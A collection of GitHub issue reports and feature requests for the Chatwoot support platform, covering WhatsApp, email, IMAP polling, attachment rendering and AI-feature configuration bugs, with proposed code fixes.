title: Image attachment shows "Failed to load" on first render when sent via WhatsApp Cloud API — Vue component re-mounts on WebSocket status update, aborting the in-flight request
author: ErnaneJ
body: ### Describe the bug When an agent sends an image via a WhatsApp Cloud API inbox, the message bubble immediately shows a "Failed to load" error instead of the image thumbnail. The image is delivered to the WhatsApp recipient correctly. After a page refresh (F5), the image displays normally in the conversation. ### To Reproduce 1. Open a WhatsApp Cloud API conversation in Chatwoot with DevTools Network tab open 2. Send an image attachment from the agent side 3. The message bubble shows a "Failed to load" error icon instead of the image 4. In DevTools Network, observe two requests for the same image URL: the first is cancelled with no response body, the second (triggered by clicking the error area) returns 200 OK with valid image data 5. Press F5 — the image displays correctly ### Expected behavior The image thumbnail displays in the message bubble immediately after sending, without requiring a page refresh or a manual click. Environment: Self-hosted (Docker Compose) ### Environment Other [please specify in the description] ### Cloud Provider DigitalOcean ### Platform Browser ### Operating system Ubuntu 22.04 ### Browser and version Chrome 136 ### Docker (if applicable) _No response_ ### Additional context Confirmed via DevTools. Two network requests are made for the same image URL: - First request: cancelled/aborted — Response tab shows no data ("Nothing to preview"). This triggers the element's onerror event. - Second request (after clicking the error area): returns HTTP 200 with valid PNG binary (confirmed by 89 50 4E 47 magic bytes in the Response tab). The first request is aborted because a WebSocket message_updated event arrives while the image is loading (status changes from sending to sent). This triggers a Vue component re-render that destroys and re-creates the element, aborting the in-flight HTTP request. Once onerror fires, the component enters a permanent error state and does not recover even after the image loads successfully on subsequent requests. The image IS delivered to the WhatsApp recipient correctly — this is a pure UI rendering bug. The fix should stabilize the media component's key so that message status transitions (sending → sent → delivered) do not cause the element to unmount mid-request.

title: Attachment#inline_audio_url hardcodes rails_storage_redirect_url, ignoring resolve_model_to_route = :rails_storage_proxy
author: ErnaneJ
body:
### Describe the bug

`Attachment#inline_audio_url` explicitly calls `rails_storage_redirect_url`, bypassing the `config.active_storage.resolve_model_to_route` setting entirely. When `resolve_model_to_route = :rails_storage_proxy` is configured (required for S3 setups to avoid CORS/ORB failures), audio URLs still point directly to S3 instead of going through the Rails proxy. Chrome blocks the cross-origin range request with `ERR_BLOCKED_BY_ORB` and audio playback fails.

**Environment**: Self-hosted (Docker Compose)

### To Reproduce

1. Set `config.active_storage.resolve_model_to_route = :rails_storage_proxy` (required when using S3 to avoid CORS issues)
2. Configure `ACTIVE_STORAGE_SERVICE=amazon`
3. Receive an audio message from any channel
4. Inspect the audio player URL in DevTools. it points directly to S3, not to the Rails proxy
5. Chrome blocks the range request: `ERR_BLOCKED_BY_ORB`, audio fails to play

### Expected behavior

Audio URLs respect `resolve_model_to_route` and go through the Rails proxy, just like `file_url` does.

### Environment

Other [please specify in the description]

### Cloud Provider

DigitalOcean

### Platform

Browser

### Operating system

Ubuntu 22.04

### Browser and version

Chrome 136

### Docker (if applicable)

_No response_

### Additional context

The inconsistency is in `app/models/attachment.rb`. `file_url` uses `url_for(file)`, which respects the configured route. `inline_audio_url` does not:

```ruby
# respects config ✓
def file_url
  url_for(file)
end

# hardcoded, ignores config ✗
def inline_audio_url
  rails_storage_redirect_url(file, disposition: 'inline')
end
```
Fix is one line:
```ruby
def inline_audio_url
  return '' unless file.attached?
  url_for(file)
end
```

Also related: `normalize_opus_content_type` in `config/initializers/active_storage.rb` updates the database blob record from `audio/opus` to `audio/ogg` before sending to Meta/WhatsApp, but does not update the S3 object metadata. The Meta API downloads the file directly from S3, receives `Content-Type: audio/opus`, and rejects it with error **131053** ("Unsupported Voice mime type"). The S3 object needs an in-place copy with metadata_directive: 'REPLACE' to fix the Content-Type at rest.

title: [please ignore] created in wrong repo by mistake
author: jinl0ng
body: Apologies — this was created in the wrong repository by mistake. Please ignore.

title: Feature request: Group emails with the same subject into a single conversation thread
author: chumaty
body: ### Is your feature or enhancement related to a problem? Please describe. Chatwoot currently creates a separate conversation for every incoming email when the messages do not contain matching In-Reply-To or References headers, even if they have the same sender and the same subject. Some services send each notification as a completely new email instead of a proper email reply. For example, multiple messages may have the same subject: New chat message for order #59016723331 Although all these emails relate to the same order and the same customer conversation, Chatwoot displays every email as a separate conversation. This makes the inbox difficult to use because agents see many duplicate-looking conversations and must open each one separately to understand the full history. There is no convenient way to read the messages as one continuous correspondence. Email clients such as Gmail and Outlook group related emails into conversation threads, which makes the full communication history much easier to follow. ### Describe the solution you'd like Please add an option to group related incoming emails into a single Chatwoot conversation based on their subject, similar to conversation view in Gmail or Outlook. The grouping could use a normalized email subject by removing prefixes such as: Re: Fwd: FW: To prevent unrelated emails from being merged, the grouping rules could also consider: the inbox; sender or contact; recipients; normalized subject; a configurable time period; an identifier extracted from the subject, such as an order number; existing Message-ID, In-Reply-To, and References headers when available. For example, all emails with this subject: New chat message for order #59016723331 should appear inside one conversation as a chronological message thread instead of creating a new Chatwoot conversation for every incoming email. It would also be useful to make this behavior configurable for each email inbox, because some users may prefer the current behavior while others need Gmail- or Outlook-style email threading. ### Describe alternatives you've considered _No response_ ### Additional context _No response_

title: Email Conversation UX Improvement - Long Threads/Messages
author: gui-bakaukas-qitech
body:
### Is your feature or enhancement related to a problem? Please describe.

Reading long email conversations in the agent dashboard becomes hard to follow. Every email message in a conversation renders **fully expanded**, stacked one after another. On a thread with many replies (and with quoted history inside each message) the view turns into a long, noisy wall of text where it's difficult to see **how many messages there are, who replied, and where the latest reply is**.

Today the only per-message affordance is a **"show/hide quotation"** toggle for the quoted portion inside a single message (in `app/javascript/dashboard/components-next/message/bubbles/Email/Index.vue`). There is:

- **No way to collapse a whole message** to a compact header (the message body always takes full height), and
- **No thread-level control** to collapse/expand all messages at once.

So a 15-message thread is 15 full-height blocks the agent has to scroll through every time, even to find the one new reply at the bottom.


### Describe the solution you'd like

Bring the **Gmail-style collapsed-thread reading experience** to email conversations:

1. **Collapsible messages.** Each email message can collapse to a **single-line header row** — sender name/email, a short snippet of the body, timestamp, and an attachment/paperclip indicator — and expand back to the full message on click.

   ```
   Collapsed thread                                   Expanded (one message open)
   ┌──────────────────────────────────────────┐      ┌──────────────────────────────────────────┐
   │ ▸ Alice <alice@acme.com>   "…thanks, that │      │ ▸ Alice <alice@acme.com>        09:12  📎 │
   │   works for me"                    09:12   │      │ ▸ Bob <bob@acme.com>            09:20     │
   │ ▸ Bob <bob@acme.com>       "can we move…" │      │ ▾ Carol <carol@acme.com>       09:41      │
   │                                    09:20   │      │     Hi both, confirming the transfer …    │
   │ ▾ Carol <carol@acme.com>   (latest) 09:41 │      │     [full body, with the existing quote   │
   │     Hi both, confirming …                  │      │      show/hide toggle still available]    │
   └──────────────────────────────────────────┘      └──────────────────────────────────────────┘
   ```

2. **Smart defaults (Gmail behavior).** On opening a conversation, **collapse all messages except the latest** (and keep any unread ones expanded), so the agent lands on the newest reply without scrolling. This is the single biggest readability win.

3. **Thread-level "Expand all / Collapse all" control** in the conversation header/toolbar, so an agent can flip the whole thread at once.

4. **Keep the existing quote toggle** inside an expanded message (the current show/hide-quotation behavior stays; collapse operates at the message level, above it).

This mirrors how Gmail renders a thread: a stack of collapsed one-liners with the most recent message open, click to 

### Describe alternatives you've considered

- **Only the current quote toggle** — helps a bit within one message, but doesn't reduce the number of full-height blocks, so long threads are still a wall.
- **Relying on the sub-thread grouping / faithful-HTML work** — complementary (better *within* a message), but doesn't address the *thread-level* navigation problem this request is about.
- **Just scrolling** — the status quo; doesn't scale past a handful of messages.


### Additional context

**Where this lives in code (v4.14.2-ce, still current on `develop`):**

- Email message bubble: `app/javascript/dashboard/components-next/message/bubbles/Email/Index.vue` — renders the body and already owns the per-message **show/hide quotation** toggle. A per-message **collapsed/expanded** state (defaulting to collapsed for all-but-latest) would live here, with the collapsed view showing a compact header.
- Message header meta: `app/javascript/dashboard/components-next/message/bubbles/Email/EmailMeta.vue` — already computes sender/subject; it's the natural source for the collapsed-row label (sender + timestamp + attachment indicator). (Note: it currently only resolves a sender *name* when the sender equals the conversation contact, so multi-participant threads can show a blank name — worth fixing alongside, so collapsed rows always show *who* sent each message.)
- Body/quote handling: `app/javascript/dashboard/helper/emailQuoteExtractor.js` — the snippet for a collapsed row can reuse the de-quoted body text this already produces.

**Scope note:** this is a **frontend-only** change (Vue), no API/schema changes — collapse state is view state. It's additive and backward-compatible: default-collapse-all-but-latest can be the new default, or gated behind a toggle if maintainers prefer to preserve current behavior.

**Impact:** email is a first-class channel in Chatwoot, and long email threads (support, operations, back-office) are common. Gmail-style collapsing is the standard mental model users already have for reading email, and it dramatically improves scanability of long conversations for agents.

title: Email Pooling Delay at High Volume
author: gui-bakaukas-qitech
body:
### Describe the bug

The IMAP email channel fetch is **stateless**: on every poll it runs `SEARCH SINCE <today - 1 day>` and re-reads the *entire* trailing-day window of the mailbox, then relies on Message-ID de-duplication to avoid re-creating conversations. There is no fetch cursor (no stored UID, no `\Seen`/label, `BODY.PEEK` is used so nothing is marked read).

This makes each poll cost `O(messages received in the last day)` — paid **every polling cycle (~1 min), indefinitely**, even when almost nothing is new. On a high-volume inbox this degrades badly:

- The per-poll fetch fetches and parses the header of *every* message in the window and does a `find_by(source_id:)` per message just to discard the ones already imported.
- New mail is the most recent, so it sits at the **end** of the (oldest-first) scan and is only processed after the whole backlog is walked.
- Result: fetch durations of **100–140 s** and **~15–20 minutes of ingestion delay** between an email arriving and the conversation being created.

A telltale sign is that the `found=` count in the logs is **constant across every poll** for a given inbox (it reflects the window size, not new mail):

```
[IMAP::FETCH_EMAIL_SERVICE] Fetching mails from high-volume@example.com, found 878.
... (next poll, ~1 min later) ...
[IMAP::FETCH_EMAIL_SERVICE] Fetching mails from high-volume@example.com, found 878.
[ActiveJob] [Inboxes::FetchImapEmailsJob] Performed Inboxes::FetchImapEmailsJob ... in 133861.67ms
```

This affects all IMAP-based channels equally — `Imap::FetchEmailService` (password), `Imap::GoogleFetchEmailService`, and `Imap::MicrosoftFetchEmailService` all inherit the same `Imap::BaseFetchEmailService#fetch_mail_for_channel`, so the Google/Microsoft "Sign in with…" integrations do **not** avoid it (they only change authentication).


### To Reproduce

I have a working implementation running against `v4.14.2-ce`;

1. Connect an email inbox via IMAP to a mailbox that receives a high daily volume (e.g. ~2,000+ messages/day — an operations/notifications mailbox).
2. Let it run and watch the worker logs (the `Inboxes::FetchImapEmailsJob` on the `scheduled_jobs` queue).
3. Observe that every poll logs the same `found=N` (≈ the number of messages in the last day), regardless of how few are actually new.
4. Observe fetch durations climbing into the tens/hundreds of seconds (`Performed Inboxes::FetchImapEmailsJob ... in <ms>`).
5. Send a new email to that mailbox and measure the delay until the conversation appears — it can be many minutes, bounded by the time the fetch takes to walk the whole window.


### Expected behavior


Fetching should be **incremental** — cost proportional to the number of *new* messages since the last successful poll (`O(new)`), not to the size of the trailing-day window (`O(messages/day)`). A newly arrived email should become a conversation within seconds regardless of how much historical mail sits in the mailbox, and repeated polls of an idle inbox should do near-zero work.


### Environment

Kubernetes

### Cloud Provider

GCP

### Platform

Browser

### Operating system

 Linux (container)

### Browser and version

N/A (backend email ingestion)

### Docker (if applicable)

- Chatwoot image: `chatwoot/chatwoot:v4.14.2-ce`
- Also present on `develop` — `app/services/imap/base_fetch_email_service.rb` still uses `search(['SINCE', since])` with no cursor as of this writing.


### Additional context


**Root cause (code).** In `app/services/imap/base_fetch_email_service.rb`:

- `fetch_available_mail_sequence_numbers` → `imap_client.search(['SINCE', since])`.
- `since` → `Time.zone.today - (interval || 1)` and is **date-granular** (`strftime('%d-%b-%Y')`), so the smallest possible window is ~1 day; it cannot be tuned smaller.
- The whole window is walked (`each_slice(MAX_MESSAGES_PER_SYNC)`), each message's header is fetched (`BODY.PEEK[HEADER]`) and de-duplicated via `email_already_present?` (`find_by(source_id:)`, one query per message).
- `MAX_MESSAGES_PER_SYNC = 500` caps *new* messages per sync but does nothing to reduce the re-scan of already-imported ones.
- No cursor is persisted anywhere; nothing is marked on the server (`BODY.PEEK` intentionally does not set `\Seen`).

Because there is no forward cursor, the service cannot tell "already processed" from "new" without re-examining the whole window every time — which is the entire cost.

**Proposed fix — incremental fetch by IMAP UID.** IMAP UIDs are monotonic within a mailbox (scoped by `UIDVALIDITY`), which is exactly the primitive needed for an incremental cursor:

1. Persist the last processed UID and the mailbox `UIDVALIDITY` per channel. `channel_email.provider_config` (jsonb) already exists, so **no migration is required**:
   ```ruby
   # after a successful sync
   channel.provider_config['imap_cursor'] = { 'last_uid' => max_uid, 'uidvalidity' => uidvalidity }
   ```
2. Fetch only new UIDs instead of the whole window:
   ```ruby
   def fetch_available_mail_uids
     last_uid = cursor['last_uid'].to_i
     if incremental? && last_uid.positive? && cursor['uidvalidity'].to_i == current_uidvalidity.to_i
       # `N:*` always includes the highest UID even when none are >= N, so filter.
       imap_client.uid_search(['UID', "#{last_uid + 1}:*"]).select { |uid| uid > last_uid }
     else
       imap_client.uid_search(['SINCE', since]) # first run / UIDVALIDITY reset / periodic safety sweep
     end
   end
   ```
   (Header/body fetches switch to `uid_fetch`.)

**Correctness / safety considerations** (handled in the proposed change):
- **UIDVALIDITY change** → treat the cursor as invalid and fall back to a full `SINCE` scan, then re-seed.
- **`N:*` quirk** → always filter `uid > last_uid`.
- **First run / no cursor** → seed from a full `SINCE` scan, then record the max UID.
- **Cap interaction** → advance the cursor only to the highest UID actually *examined*, so a sync that stops at `MAX_MESSAGES_PER_SYNC` never skips the messages it didn't reach.
- **Self-heal** → keep the existing Message-ID de-dup as an idempotency backstop, and run a periodic full `SINCE` sweep (e.g. every N minutes) so a transient failure can't permanently drop a message.
- **Rollback** → gate behind an env flag (default on) so the previous behavior is one setting away.

This turns the per-poll cost from `O(messages in the last day)` into `O(new since last poll)`, eliminating the multi-minute ingestion delay and the constant redundant IMAP + DB work on high-volume inboxes. It is a backend-only change to a single file (all three IMAP subclasses inherit it) and needs no schema migration.

title: Contact search results show initials instead of existing contact avatars
author: KevinAsher
body:
### Describe the bug

Contact search results render fallback initials even when the contact already has an avatar. Opening the same contact detail page shows the avatar correctly, so the avatar is stored and available; it is just missing from the contact search response.

Proof from a local self-hosted v4.15.1 CE Docker setup, with identifying text blurred:

![Contact search result uses initials while the contact detail has an avatar](https://raw.githubusercontent.com/KevinAsher/chatwoot/9344c3251e7a3c759a2c363a230ae434e98c06c5/docs/proof/search-contact-thumbnail-bug.gif)

### To Reproduce

1. Use a Chatwoot account with contacts that have uploaded/synced avatars.
2. Open global search and search for a contact.
3. Switch to the `Contacts` tab in search results.
4. Notice the search result row shows the fallback initials avatar.
5. Open the same contact.
6. Notice the contact detail page shows the real avatar image.

### Expected behavior

Contact search results should include and render the same contact avatar thumbnail that is available on the contact detail page.

### Environment

Docker

### Cloud Provider

Other [please specify in the description]

### Platform

Browser

### Operating system

macOS / Darwin 25.5.0 arm64

### Browser and version

Chromium-based browser

### Docker (if applicable)

- Chatwoot image: `chatwoot/chatwoot:v4.15.1-ce`
- Docker Server Version: `29.4.0`
- Docker Compose: `v5.1.2`

### Additional context

The current contact search serializer returns contact identity fields but does not include `thumbnail`, while other contact-facing API responses do include the contact thumbnail/avatar URL. Adding `json.thumbnail contact.avatar_url` to `app/views/api/v1/accounts/search/_contact.json.jbuilder` fixes the listing UI for contacts that already have avatars.

title: WhatsApp incoming-to-incoming replies are not shown as quoted replies
author: mohamadibrahem
body:
### Describe the bug

I use Chatwoot version | 4.15.1

When a WhatsApp Cloud API customer replies to a previous incoming message that was originally sent by the same customer, Chatwoot does not display the reply as a quoted/replied message.

The issue only happens for incoming-to-incoming replies:

Customer message → saved in Chatwoot as incoming
Customer replies to that same previous message from WhatsApp → the new message arrives in Chatwoot, but it is not linked to the original message.

However, replies to outgoing messages sent from Chatwoot work correctly:

Chatwoot agent message → customer replies from WhatsApp → Chatwoot correctly shows the quoted reply.

From the webhook payload, Meta sends the reply context correctly. For example, the reply message contains:

"context": {
"from": "2010***********",
"from_user_id": "EG.1442***********",
"id": "wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA=="
}

The new reply message is saved in Chatwoot, but its reply attributes are not linked:

"content_attributes": {
"in_reply_to_external_id": nil,
"in_reply_to": nil
}

The original incoming message exists in Chatwoot, but its stored source_id is different from the context.id sent by Meta.

Original incoming message saved in Chatwoot:

content: "مرحبا"
source_id: "wamid.HBgMMjAxMDIwNzA5ODU2FQIAEhggQTU2NkI1NDVDMjQyREIzMzI3NTVGQzI4MUI3QTVFOTgA"

Reply message from WhatsApp:

content: "اهلا"
context.id: "wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA=="

Database check:

Message.find_by(
source_id: "wamid.HBgMMjAxMDIwNzA5ODU2FQIAEhggQTU2NkI1NDVDMjQyREIzMzI3NTVGQzI4MUI3QTVFOTgA"
)

returns the original incoming message.

But:

Message.find_by(
source_id: "wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA=="
)

returns nil.

Because of this mismatch, Chatwoot cannot find the original incoming message and does not populate in_reply_to or in_reply_to_external_id.

Expected behavior:
Chatwoot should correctly show quoted replies when a WhatsApp customer replies to their own previous incoming message, the same way it already works when the customer replies to an outgoing Chatwoot message.

Actual behavior:
The reply message is received and displayed as a normal incoming message, but the quoted/replied message is not shown in Chatwoot.


### To Reproduce

1. Configure a WhatsApp Cloud API inbox in Chatwoot.

2. From a WhatsApp customer account, send a normal text message to the Chatwoot WhatsApp number.
   Example message:
   "مرحبا"

3. Confirm that the message is received in Chatwoot as an incoming message.

4. From the same WhatsApp customer account, long-press the previous message "مرحبا" inside WhatsApp and choose Reply.

5. Send a reply message.
   Example reply:
   "اهلا"

6. Check the WhatsApp webhook payload. Meta sends a valid reply context in the new message:

"context": {
"from": "2010*********",
"from_user_id": "EG.14427***********",
"id": "wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA=="
}

7. Open the same conversation in Chatwoot.

8. Notice that the reply message "اهلا" appears as a normal incoming message, but it is not displayed as a quoted/replied message linked to "مرحبا".

9. Check the database record for the reply message:

Message.where(content: "اهلا").last.content_attributes

Actual result:

{
"in_reply_to_external_id": nil,
"in_reply_to": nil
}

10. Compare this with replying to an outgoing message sent from Chatwoot. In that case, Chatwoot correctly fills in_reply_to_external_id and in_reply_to, and the quoted reply appears correctly.


### Expected behavior

_No response_

### Environment

app.chatwoot.com

### Cloud Provider

None

### Platform

None

### Operating system

_No response_

### Browser and version

_No response_

### Docker (if applicable)

_No response_

### Additional context

_No response_

title: Missing empty line above email signature when replying to a customer
author: motomotolukas
body: ### Describe the bug After upgrading the newer version, there is an issue when replying to a customer. When the reply editor opens, the email signature is inserted too close to the message input area, and there is no empty editable line above the signature. Because of this, the agent cannot start writing the reply normally. To write a message, the agent has to manually insert an empty line so that the signature moves down and there is space to type the response. This worked correctly in previous versions. ### To Reproduce Try to replay with a signature ### Expected behavior _No response_ ### Environment Docker ### Cloud Provider None ### Platform Browser ### Operating system _No response_ ### Browser and version _No response_ ### Docker (if applicable) _No response_ ### Additional context _No response_

title: Feature Request: Allow forwarding conversations/emails with a custom message and agent information
author: motomotolukas
body:
### Is your feature or enhancement related to a problem? Please describe.

I would like to request an improvement to the current conversation/email forwarding feature in Chatwoot.

At the moment, it is possible to forward a conversation as a transcript, but there is no option to add a custom message or comment when forwarding it. Also, the recipient does not see which agent forwarded the conversation.

Because of this, the recipient receives the forwarded transcript without context. They do not know why they received it, what action is expected from them, or who forwarded it.

### Describe the solution you'd like

It would be very useful if agents could forward a conversation/email and include:

A custom message or comment above the forwarded transcript.
The name of the agent who forwarded it.

### Describe alternatives you've considered

_No response_

### Additional context

This would make forwarded conversations much clearer and more useful for internal collaboration. The recipient would immediately understand:

Who sent the forwarded conversation.
Why they received it.
What they need to do next.

This would be a perfect improvement for teams that use Chatwoot for support, sales, operations, or internal escalation workflows.

I had already raised this request before, and it also received interest from other users. I believe this feature would fully satisfy an important missing workflow in Chatwoot.

title: Agent misses another agent's reply after websocket reconnect until page refresh
author: 0marAmara
body:
### Describe the bug

In a shared inbox conversation, one agent can miss another agent's outbound reply in real time if their websocket connection drops and reconnects.

  In the observed case:

  - Agent 2 was logged in and had the conversation cached in the UI.
  - Agent 2's `/cable` websocket disconnected.
  - Agent 1 replied to the customer while Agent 2 was disconnected.
  - The backend successfully created and broadcast the `message.created` event.
  - Agent 2 reconnected, but the frontend reconnect recovery only fetched conversations updated within a very small window, `updated_within=26`.
  - The missed conversation was older than that window, so Agent 2's UI remained stale.
  - Agent 2 replied to the same customer without seeing Agent 1's previous reply.
  - After refreshing the page, Agent 2 could see Agent 1's reply.

This appears to be a frontend sync/reconnect recovery issue, not a failed message creation or failed Sidekiq broadcast.

### To Reproduce

 1. Log in as Agent 1 and Agent 2.
  2. Open or cache the same conversation in Agent 2's browser.
  3. Interrupt Agent 2's websocket connection, for example by briefly disabling network access or causing `/cable` to disconnect.
  4. While Agent 2 is disconnected, send a reply from Agent 1 in that conversation.
  5. Restore Agent 2's connection and allow the app to reconnect.
  6. Observe that the reconnect recovery may call the conversations API with a small `updated_within` value.
  7. Open the conversation as Agent 2.
  8. Observe that Agent 1's message may be missing until a full page refresh.

### Expected behavior

After reconnecting, Agent 2 should reliably see all messages that were created while the websocket was disconnected.

  At minimum, opening an already-cached conversation after reconnect should sync messages from the server so the agent does not reply based on stale
  conversation history.

### Environment

Linux VM

### Cloud Provider

AWS

### Platform

Browser

### Operating system

Linux VM on AWS EC2

### Browser and version

_No response_

### Docker (if applicable)

_No response_

### Additional context

**Additional Context**
  Relevant log timeline, with sensitive values redacted:
```
  2026-07-04T10:52:28Z
  Finished "/cable" [WebSocket] for Agent 2 IP
  RoomChannel stopped streaming from Agent 2 pubsub token

  2026-07-04T10:55:43Z
  Agent 1 POST /api/v1/accounts/1/conversations/653/messages
  message.created broadcast enqueued for message id 4527
  ActionCableBroadcastJob performed successfully in 3.66ms

  2026-07-04T11:00:54Z
  Agent 2 reconnected to /cable
  RoomChannel streaming resumed for Agent 2 pubsub token

  2026-07-04T11:00:55Z
  GET /api/v1/accounts/1/conversations?status=open&assignee_type=all&sort_by=last_activity_at_desc&updated_within=26

  2026-07-04T11:11:32Z
  Agent 2 POST /api/v1/accounts/1/conversations/653/messages
  No preceding GET /api/v1/accounts/1/conversations/653/messages from Agent 2 was seen before this reply.
```
  The likely weak point is reconnect recovery relying on a very small client-calculated updated_within value. A possible fix would be to use a minimum reconnect
  lookback window, or to force a message sync when opening an already-cached active conversation after reconnect.

title: BSUID whatsapp
author: slmartinez
body: ### Describe the bug I tested the scenario mentioned by @sony-mathew (mixed payload followed by BSUID-only payload) on a self-hosted instance with PR #14436 merged, using the **exact payload format documented by Meta** (i.e. `wa_id` is completely omitted when the phone number is unavailable — the BSUID only appears in `user_id`/`from_user_id`, not stuffed into `wa_id`). (v4.15.1) Then I sent a cURL request to simulate the new behavior where the phone number field will no longer be included. This causes the conversation to be duplicated. ### To Reproduce **Step 1:** A contact messages normally (payload includes both `wa_id`/phone and `from_user_id`/BSUID). This creates `contact_id: 220` with `contact_inbox_id: 121` (source_id = phone number) and conversation `id: 169`. **Step 2:** I simulated a BSUID-only inbound message (no `from`/phone field, simulating a user who has enabled WhatsApp usernames and hidden their phone number): ​```bash curl -v -X POST https://your-chatwoot-instance.com/webhooks/whatsapp/ \ -H "Content-Type: application/json" \ -d '{ "object": "whatsapp_business_account", "entry": [{ "id": "", "changes": [{ "value": { "messaging_product": "whatsapp", "metadata": { "display_phone_number": "573000000001", "phone_number_id": "" }, "contacts": [{ "profile": {"name": "Test User", "username": "testuser123"}, "user_id": "CO.XXXXXXXXXXXXXXXX" }], "messages": [{ "from_user_id": "CO.XXXXXXXXXXXXXXXX", "id": "wamid.TESTBSUIDONLY002", "timestamp": "'"$(date +%s)"'", "text": {"body": "message with BSUID only, no phone number"}, "type": "text" }] }, "field": "messages" }] }] }' ​``` **Result:** This created a *second* `contact_inbox` (id: 122, source_id = BSUID) for the **same** `contact_id: 220`, and a **new, separate conversation** (`id: 170`) instead of continuing the existing one (`id: 169`): In the Chatwoot UI, this shows up as two separate open conversations for the same contact: This confirms the P1 finding @sony-mathew mentioned in the RSpec reproduction: mixed-then-BSUID-only inbound messages split the conversation thread instead of merging into the existing one. ## Additional finding: outbound sending fails on the BSUID-only conversation When attempting to reply from the agent side on the conversation created via the BSUID-only `contact_inbox` (id: 122), the outgoing message fails with: ​``` external_error: "131026: Message undeliverable" ​``` This suggests the outgoing send is using the `contact_inbox.source_id` (the BSUID) directly as the `to` recipient in the WhatsApp Cloud API call, which Meta's Send API does not yet support as a valid recipient format outside of the officially documented BSUID-sending flow (expected June 2026 per Meta's docs). This makes any conversation anchored to a BSUID-only `contact_inbox` effectively unable to receive agent replies. ### Expected behavior When a WhatsApp user sends a message using only their BSUID (no phone number present in the payload, e.g. after enabling WhatsApp usernames and hiding their phone number), Chatwoot should recognize that the BSUID belongs to an existing contact (matched via a prior mixed payload containing both phone and BSUID) and continue the existing conversation thread. Instead, Chatwoot creates a new, separate `ContactInbox` and a new `Conversation` for the same contact, splitting the conversation history into two threads for what is the same underlying WhatsApp user. ### Environment Linux VM ### Cloud Provider DigitalOcean ### Platform Browser ### Operating system linux ### Browser and version chrome ### Docker (if applicable) _No response_ ### Additional context _No response_

title: Translate action silently does nothing when Google Translate integration is not configured
author: moonexplore
body:
## Describe the bug

The message context menu shows the `Translate` action even when the Google Translate integration is not configured for the account.

Clicking `Translate` sends a request to the backend, but nothing visible happens in the UI. No translated content is shown, and no warning or error explains that Google Translate has not been configured.

This makes the feature appear broken to agents instead of clearly indicating that setup is required.

## To Reproduce

1. Use a Chatwoot account where `Settings -> Applications -> Google Translate` has not been configured.
2. Open any conversation with a text message.
3. Open the message context menu.
4. Click `Translate`.
5. Observe that the menu closes, but no translation appears and no feedback is shown.

## Expected behavior

Chatwoot should either:

- Hide or disable the `Translate` action when Google Translate is not configured, or
- Show a clear message such as: `Google Translate is not configured. Please configure it in Settings -> Applications.`

The API should also return a meaningful error response when the integration hook is missing, instead of returning an empty translation result.

## Environment

Docker

## Cloud Provider

Other [please specify in the description]

## Platform

Browser

## Operating system

_No response_

## Browser and version

_No response_

## Docker (if applicable)

Self-hosted Docker installation.

## Additional context

In my local self-hosted instance, there is no `google_translate` integration hook for the account:

```ruby
Integrations::Hook.where(app_id: "google_translate")
# => []
```

When clicking `Translate`, the frontend still calls:

```text
POST /api/v1/accounts/:account_id/conversations/:conversation_id/messages/:message_id/translate
```

The backend reaches `Integrations::GoogleTranslate::ProcessorService#perform`, but returns early when no Google Translate hook exists. The frontend action currently catches and ignores errors, so the user receives no feedback.

Relevant behavior:

- The action is visible and clickable.
- The request completes without useful user-facing feedback.
- No translation is stored in `content_attributes.translations`.

title: Support descriptions for WhatsApp input_select list rows
author: izcoser
body: ### Is your feature or enhancement related to a problem? Please describe. WhatsApp interactive list rows support an optional description/subtitle for each row. Chatwoot currently exposes `input_select` items with `title` and `value`, but rejects an item-level `description` key during message validation. This prevents integrations from rendering compact WhatsApp list titles with longer explanatory subtitles. For example, an education/tenant bot may need list rows like: - title: `Option 1` - description: `Nursing - Distance Learning | 2026/1` Without description support, the integration must either truncate meaningful labels to WhatsApp row title limits or move all details into the message body, which is a worse UX for longer menus. Current behavior when sending `content_type: input_select` with item descriptions: ```json { "content_type": "input_select", "content_attributes": { "items": [ { "title": "Option 1", "value": "option_1", "description": "Nursing - Distance Learning | 2026/1" } ] } } ``` Chatwoot rejects it because `description` is not in the allowed select item keys. ### Describe the solution you would like Allow `description` as an optional key for `input_select` items and forward it when building WhatsApp list rows. A rough implementation would be: 1. Add `description` to `ContentAttributeValidator::ALLOWED_SELECT_ITEM_KEYS`. 2. Update `Whatsapp::Providers::BaseService#create_rows` to include `description` when present: ```ruby row = { "id" => item["value"], "title" => item["title"] } description = item["description"] || item[:description] row["description"] = description if description.present? ``` 3. Add/update WhatsApp provider specs to assert list rows can include `description`. This should be backward compatible because the field is optional, and existing `input_select` payloads continue to work unchanged. ### Describe alternatives you have considered The main workaround is to put all row details in the message body and keep list row titles short, but this makes the interactive list less useful and less readable. Another alternative is for external middleware to bypass Chatwoot and call WhatsApp directly, but that loses the benefit of using Chatwoot as the source of truth for channel delivery. ### Additional context This applies specifically to WhatsApp list messages. WhatsApp reply buttons do not support row descriptions, so this enhancement is most useful when Chatwoot renders `input_select` as a list message. Whatsapp screenshot of the output we want Chatwoot to do, which it currently can't:

title: feat: Extend configurable model/endpoint (added in #12563 / #13141) to reply composer AI actions, not just Captain
author: hectorroaz
body:
### Is your feature or enhancement related to a problem? Please describe.

#12563 (fixed via #13141) added a configurable API base URL and model for Captain under Settings → Captain, so self-hosted installs can point to OpenAI-compatible providers (Groq, Together AI, DeepSeek, etc). However, that configurability only reaches Captain-specific features (RAG conversations, FAQ generation, article translation, widget tagline).

The reply composer's AI writing-assist actions — **Improve Reply, Fix Spelling & Grammar, Change Tone, Reply Suggestion, Summarize, Label Suggestion** — are implemented in `lib/captain/rewrite_service.rb`, `reply_suggestion_service.rb`, `summary_service.rb`, `label_suggestion_service.rb`, and `follow_up_service.rb`, all inheriting from `Captain::BaseTaskService`. These hardcode:

```ruby
GPT_MODEL = Llm::Config::DEFAULT_MODEL # 'gpt-4.1-mini' — lib/llm/config.rb
```

